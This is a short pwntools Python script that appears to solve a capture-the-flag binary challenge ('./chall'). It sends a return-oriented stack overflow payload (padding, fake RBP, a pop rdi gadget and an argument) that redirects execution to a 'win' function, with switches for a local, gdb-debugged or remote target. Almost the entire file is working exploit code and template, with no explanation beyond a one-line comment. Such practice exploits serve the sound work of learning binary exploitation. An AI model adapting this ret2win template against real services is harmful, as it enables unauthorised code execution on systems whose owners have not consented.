#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
  # c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

pop_rdi = 0x4011c2

#         vuln_buf              RBP               RIP
payload = p64(0xdeadbeef) * 4 + p64(0xcafebabe) + p64(pop_rdi) + p64(0x1337cafe) + p64(elf.sym.win + 1)
p.sendlineafter(b'pwnme> ', payload)

p.interactive()

# NOTE:
# Ret2win w param
